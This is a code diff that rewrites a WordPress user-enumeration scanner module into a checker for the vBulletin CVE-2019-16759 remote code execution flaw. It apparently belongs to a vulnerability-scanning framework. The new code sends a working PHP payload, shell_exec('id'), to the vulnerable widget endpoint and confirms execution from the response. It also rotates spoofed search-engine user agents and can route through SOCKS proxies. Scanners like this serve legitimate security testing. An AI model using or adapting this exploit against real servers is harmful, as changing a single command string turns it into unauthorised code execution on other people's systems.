@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# Author: Pradeep Jairamani , github.com/pradeepjairamani
+# Author: Aman Gupta github.com/aman566
+# https://www.zdnet.com/article/security-researcher-publishes-details-and-exploit-code-for-a-vbulletin-zero-day/
 
 import socket
 import socks
@@ -10,10 +11,14 @@ import threading
 import string
 import random
 import sys
+import struct
 import re
 import os
-from core.alert import warn, info, messages
+from OpenSSL import crypto
+import ssl
+from core.alert import *
 from core.targets import target_type
+import logging
 from core.targets import target_to_host
 from core.load_modules import load_file_path
 from lib.socks_resolver.engine import getaddrinfo
@@ -23,16 +28,14 @@ import requests
 
 
 def extra_requirements_dict():
-    return {"wp_user_enum_ports": [80, 443]}
+    return {"vbulletin_cve_2019_16759_vuln_ports": [443, 80]}
 
 
 def conn(targ, port, timeout_sec, socks_proxy):
     try:
         if socks_proxy is not None:
             socks_version = (
-                socks.SOCKS5
-                if socks_proxy.startswith("socks5://")
-                else socks.SOCKS4
+                socks.SOCKS5 if socks_proxy.startswith("socks5://") else socks.SOCKS4
             )
             socks_proxy = socks_proxy.rsplit("://")[1]
             if "@" in socks_proxy:
@@ -64,7 +67,7 @@ def conn(targ, port, timeout_sec, socks_proxy):
         return None
 
 
-def wp_user_enum(
+def vbulletin_vuln(
     target,
     port,
     timeout_sec,
@@ -77,95 +80,78 @@ def wp_user_enum(
     scan_cmd,
 ):
     try:
-        s = conn(target, port, timeout_sec, socks_proxy)
+        s = conn(target_to_host(target), port, timeout_sec, socks_proxy)
         if not s:
             return False
         else:
-            if target_type(target) != "HTTP" and port == 443:
+            if (
+                target_type(target) != "HTTP"
+                and port in extra_requirements_dict()["vbulletin_cve_2019_16759_vuln_ports"]
+            ):
                 target = "https://" + target
-            if target_type(target) != "HTTP" and port == 80:
-                target = "http://" + target
-            user_agent_list = [
-                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; \
-                    rv:1.8.0.5) Gecko/20060719 Firefox/1.5.0.5",
+            user_agent = [
+                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060719 Firefox/1.5.0.5",
                 "Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
-                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) \
-                    AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/10.04"
+                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/10.04"
                 " Chromium/9.0.595.0 Chrome/9.0.595.0 Safari/534.13",
-                "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2;\
-                     WOW64; .NET CLR 2.0.50727)",
-                "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22\
-                     Version/10.51",
+                "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
+                "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
+                "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
                 "Debian APT-HTTP/1.3 (0.8.10.3)",
-                "Mozilla/5.0 (compatible; Googlebot/2.1;\
-                     +http://www.google.com/bot.html)",
+                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                 "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
-                "Mozilla/5.0 (compatible; Yahoo! Slurp;\
-                     http://help.yahoo.com/help/us/ysearch/slurp)",
-                "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5;\
-                     yahooseeker at yahoo-inc dot com ; "
+                "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+                "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; "
                 "http://help.yahoo.com/help/us/shop/merchant/)",
+                "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+                "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+                "msnbot/1.1 (+http://search.msn.com/msnbot.htm)",
             ]
-            headers = {"User-agent": random.choice(user_agent_list)}
-            r = requests.get(
-                target + "/?feed=rss2", verify=False, headers=headers
-            )
-            r2 = requests.get(
-                target + "/?author=", verify=False, headers=headers
-            )
-            r3 = requests.get(
-                target + "/wp-json/wp/v2/users", verify=False, headers=headers
-            )
-            try:
-                r3List = json.loads(r3.text)
-            except Exception:
-                pass
-            wp_users_admin3 = []
-            try:
-                global wp_users
-                wp_users_feed = re.findall(
-                    r"<dc:creator><!\[CDATA\[(.+?)\]\]></dc:creator>",
-                    r.text,
-                    re.IGNORECASE,
-                )
-                wp_users_admin = re.findall(
-                    "author author-(.+?) ", r2.text, re.IGNORECASE
-                )
-                wp_users_admin2 = re.findall(
-                    "/author/(.+?)/feed/", r2.text, re.IGNORECASE
-                )
-                for i in r3List:
-                    wp_users_admin3.append(i["slug"])
-                wp_users = (
-                    wp_users_feed
-                    + wp_users_admin
-                    + wp_users_admin2
-                    + wp_users_admin3
-                )
-                wp_users = sorted(set(wp_users))
-                if wp_users != "":
-                    return True
-                else:
+            headers = {
+                "User-Agent": random.choice(user_agent),
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.7,ru;q=0.3",
+                "Connection": "keep-alive",
+            }
+            while True:
+                try:
+                    params = {
+                        "subWidgets[0][template]": "widget_php",
+                        "subWidgets[0][config][code]": 'echo shell_exec("id"); exit;',
+                    }
+                    if target.endswith("/"):
+                        target = target[:-1]
+                    r = requests.post(
+                        url=target + "/ajax/render/widget_tabbedcontainer_tab_panel",
+                        data=params,
+                        verify=False,
+                        headers=headers,
+                        timeout=timeout_sec,
+                    )
+                    if r.status_code == 200 and "gid" in r.text.lower():
+                        return True
+                    else:
+                        return False
+                except Exception:
                     return False
-            except Exception:
-                return False
     except Exception:
         return False
 
 
-def __wp_user_enum(
+def __vbulletin_vuln(
     target,
     port,
     timeout_sec,
     log_in_file,
     language,
+    verbose_level,
     time_sleep,
     thread_tmp_filename,
     socks_proxy,
     scan_id,
     scan_cmd,
 ):
-    if wp_user_enum(
+    if vbulletin_vuln(
         target,
         port,
         timeout_sec,
@@ -178,29 +164,28 @@ def __wp_user_enum(
         scan_cmd,
     ):
         info(
-            messages(language, "found").format(
-                target, "Wordpress users found ", ", ".join(wp_users)
+            messages(language, "target_vulnerable").format(
+                target, port, "vBulletin RCE CVE-2019-16759 Vulnerability"
             )
         )
         __log_into_file(thread_tmp_filename, "w", "0", language)
-        for i in wp_users:
-            data = json.dumps(
-                {
-                    "HOST": target,
-                    "USERNAME": i,
-                    "PASSWORD": "",
-                    "PORT": port,
-                    "TYPE": "wp_user_enum_scan",
-                    "DESCRIPTION": messages(language, "found").format(
-                        target, "Wordpress user found ", i
-                    ),
-                    "TIME": now(),
-                    "CATEGORY": "vuln",
-                    "SCAN_ID": scan_id,
-                    "SCAN_CMD": scan_cmd,
-                }
-            )
-            __log_into_file(log_in_file, "a", data, language)
+        data = json.dumps(
+            {
+                "HOST": target,
+                "USERNAME": "",
+                "PASSWORD": "",
+                "PORT": port,
+                "TYPE": "vbulletin_cve_2019_16759_vuln",
+                "DESCRIPTION": messages(language, "vulnerable").format(
+                    "vbulletin_cve_2019_16759_vuln"
+                ),
+                "TIME": now(),
+                "CATEGORY": "vuln",
+                "SCAN_ID": scan_id,
+                "SCAN_CMD": scan_cmd,
+            }
+        )
+        __log_into_file(log_in_file, "a", data, language)
         return True
     else:
         return False
@@ -240,30 +225,27 @@ def start(
                     ]
         extra_requirements = new_extra_requirements
         if ports is None:
-            ports = extra_requirements["wp_user_enum_ports"]
-        if target_type(target) == "HTTP":
-            target = target_to_host(target)
+            ports = extra_requirements["vbulletin_cve_2019_16759_vuln_ports"]
         threads = []
         total_req = len(ports)
-        thread_tmp_filename = "{}/tmp/thread_tmp_".format(
-            load_file_path()
-        ) + "".join(
-            random.choice(string.ascii_letters + string.digits)
-            for _ in range(20)
+        thread_tmp_filename = "{}/tmp/thread_tmp_".format(load_file_path()) + "".join(
+            random.choice(string.ascii_letters + string.digits) for _ in range(20)
         )
         __log_into_file(thread_tmp_filename, "w", "1", language)
         trying = 0
         keyboard_interrupt_flag = False
+
         for port in ports:
             port = int(port)
             t = threading.Thread(
-                target=__wp_user_enum,
+                target=__vbulletin_vuln,
                 args=(
                     target,
                     int(port),
                     timeout_sec,
                     log_in_file,
                     language,
+                    verbose_level,
                     time_sleep,
                     thread_tmp_filename,
                     socks_proxy,
@@ -283,7 +265,7 @@ def start(
                         total,
                         target,
                         port,
-                        "wp_user_enum_scan",
+                        "vbulletin_cve_2019_16759_vuln",
                     )
                 )
             while 1:
@@ -309,15 +291,21 @@ def start(
                 break
         thread_write = int(open(thread_tmp_filename).read().rsplit()[0])
         if thread_write == 1 and verbose_level != 0:
-            info(messages(language, "not_found"))
+            info(
+                messages(language, "no_vulnerability_found").format(
+                    "vbulletin_cve_2019_16759_vuln not found"
+                )
+            )
             data = json.dumps(
                 {
                     "HOST": target,
                     "USERNAME": "",
                     "PASSWORD": "",
                     "PORT": "",
-                    "TYPE": "wp_user_enum_scan",
-                    "DESCRIPTION": messages(language, "not_found"),
+                    "TYPE": "vbulletin_cve_2019_16759_vuln",
+                    "DESCRIPTION": messages(language, "no_vulnerability_found").format(
+                        "vbulletin_cve_2019_16759_vuln not found"
+                    ),
                     "TIME": now(),
                     "CATEGORY": "scan",
                     "SCAN_ID": scan_id,
@@ -330,6 +318,6 @@ def start(
     else:
         warn(
             messages(language, "input_target_error").format(
-                "wp_user_enum_scan", target
+                "vbulletin_cve_2019_16759_vuln", target
             )
         )
